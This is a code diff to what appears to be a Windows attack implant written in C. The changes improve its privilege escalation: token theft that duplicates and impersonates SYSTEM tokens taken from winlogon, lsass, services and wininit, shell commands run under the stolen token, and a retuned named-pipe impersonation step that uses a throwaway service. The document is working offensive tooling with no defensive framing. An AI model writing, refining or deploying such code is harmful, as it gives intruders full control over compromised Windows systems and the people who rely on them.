@@ -97,14 +97,16 @@ static char* run_shell(const char *cmd) {
         PROCESS_INFORMATION pi = {0};
         wchar_t wcmd[4096];
         MultiByteToWideChar(CP_ACP, 0, full_cmd, -1, wcmd, 4096);
-        BOOL ok = CreateProcessWithTokenW(hSysTok, 0, NULL, wcmd,
-            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+        ImpersonateLoggedOnUser(hSysTok);
+        BOOL ok = CreateProcessAsUserW(hSysTok, NULL, wcmd,
+            NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+        RevertToSelf();
         CloseHandle(hWrite);
         if (!ok) {
             DWORD err = GetLastError();
             CloseHandle(hRead);
             char *e = (char*)malloc(96);
-            snprintf(e, 96, "[error: CreateProcessWithTokenW %lu]", err);
+            snprintf(e, 96, "[error: CreateProcessAsUserW %lu]", err);
             return e;
         }
         size_t cap = 4096, len = 0;
@@ -983,51 +985,54 @@ static char *token_make(const char *user, const char *domain, const char *pass) 
     char *out=(char*)malloc(256); snprintf(out,256,"[+] impersonating %s\\%s",domain,user); return out;
 }
 
+/* Try to steal a primary+impersonation SYSTEM token from pid.
+ * Returns malloc'd "[+] T1 SYSTEM ..." on success, NULL on any failure. */
+static char *gs_try_steal(DWORD pid, const char *name) {
+    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (!hProc) return NULL;
+    HANDLE hTok = NULL;
+    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE, &hTok)) { CloseHandle(hProc); return NULL; }
+    CloseHandle(hProc);
+    HANDLE hPrim = NULL, hDup = NULL;
+    DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary,      &hPrim);
+    DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDup);
+    CloseHandle(hTok);
+    if (!hDup) { if (hPrim) CloseHandle(hPrim); return NULL; }
+    if (!ImpersonateLoggedOnUser(hDup)) { CloseHandle(hDup); if (hPrim) CloseHandle(hPrim); return NULL; }
+    CloseHandle(hDup);
+    HANDLE old = (HANDLE)InterlockedExchangePointer((PVOID*)&g_system_token, hPrim);
+    if (old) CloseHandle(old);
+    char *out = (char*)malloc(128);
+    if (out) snprintf(out, 128, "[+] T1 SYSTEM (%s PID=%lu)", name, (unsigned long)pid);
+    return out ? out : strdup("[+] T1 SYSTEM");
+}
+
 static char *get_system(void) {
-    /* ── T1: SeDebugPrivilege + token steal from winlogon ───────────────── */
+    /* ── T1: SeDebugPrivilege + token steal (winlogon → lsass → services → wininit) */
     HANDLE hSelf = NULL;
     if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hSelf)) {
         enable_privilege(hSelf, "SeDebugPrivilege"); CloseHandle(hSelf);
     }
+    static const char *SYS_PROCS[] = {"winlogon.exe","lsass.exe","services.exe","wininit.exe",NULL};
     {
         HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (snap != INVALID_HANDLE_VALUE) {
             PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
-            DWORD sysPid = 0;
             if (Process32First(snap, &pe)) {
-                do { if (_stricmp(pe.szExeFile, "winlogon.exe") == 0) { sysPid = pe.th32ProcessID; break; } }
-                while (Process32Next(snap, &pe));
+                do {
+                    for (int i = 0; SYS_PROCS[i]; i++) {
+                        if (_stricmp(pe.szExeFile, SYS_PROCS[i]) == 0) {
+                            char *r = gs_try_steal(pe.th32ProcessID, SYS_PROCS[i]);
+                            if (r) { CloseHandle(snap); return r; }
+                        }
+                    }
+                } while (Process32Next(snap, &pe));
             }
             CloseHandle(snap);
-            if (sysPid) {
-                HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, sysPid);
-                if (hProc) {
-                    HANDLE hTok = NULL;
-                    if (OpenProcessToken(hProc, TOKEN_DUPLICATE, &hTok)) {
-                        CloseHandle(hProc);
-                        HANDLE hPrim = NULL;
-                        DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrim);
-                        HANDLE hDup = NULL;
-                        if (DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDup)) {
-                            CloseHandle(hTok);
-                            if (ImpersonateLoggedOnUser(hDup)) {
-                                CloseHandle(hDup);
-                                HANDLE old = (HANDLE)InterlockedExchangePointer((PVOID*)&g_system_token, hPrim);
-                                if (old) CloseHandle(old);
-                                char *out = (char*)malloc(128);
-                                snprintf(out, 128, "[+] T1 SYSTEM (winlogon PID=%lu)", (unsigned long)sysPid);
-                                return out;
-                            }
-                            CloseHandle(hDup);
-                        } else { CloseHandle(hTok); }
-                        if (hPrim) CloseHandle(hPrim);
-                    } else { CloseHandle(hProc); }
-                }
-            }
         }
     }
 
-    /* ── T2: Named pipe impersonation via service (overlapped, 15s timeout) */
+    /* ── T2: Named pipe impersonation via service ── */
     DWORD rnd = GetTickCount() ^ (GetCurrentProcessId() << 4);
     char pipeName[64]; snprintf(pipeName, sizeof(pipeName), "\\\\.\\pipe\\svc%08lx", (unsigned long)rnd);
     char svcName[32];  snprintf(svcName,  sizeof(svcName),  "svc%08lx", (unsigned long)(rnd ^ 0xdeadbeefUL));
@@ -1074,10 +1079,16 @@ static char *get_system(void) {
     }
 
     OVERLAPPED ov; memset(&ov, 0, sizeof(ov)); ov.hEvent = hEvent;
-    StartServiceW(hSvc, 0, NULL);
     ConnectNamedPipe(hPipe, &ov); /* async — returns ERROR_IO_PENDING */
+    StartServiceW(hSvc, 0, NULL);
 
-    DWORD wr = WaitForSingleObject(hEvent, 5000);
+    /* Fast path: most services connect within 2s.
+     * If not, retry StartService once and wait 3s more (total ≤ 5s). */
+    DWORD wr = WaitForSingleObject(hEvent, 2000);
+    if (wr != WAIT_OBJECT_0) {
+        StartServiceW(hSvc, 0, NULL);
+        wr = WaitForSingleObject(hEvent, 3000);
+    }
     DeleteService(hSvc); CloseServiceHandle(hSvc); CloseServiceHandle(hScm); CloseHandle(hEvent);
 
     if (wr != WAIT_OBJECT_0) {
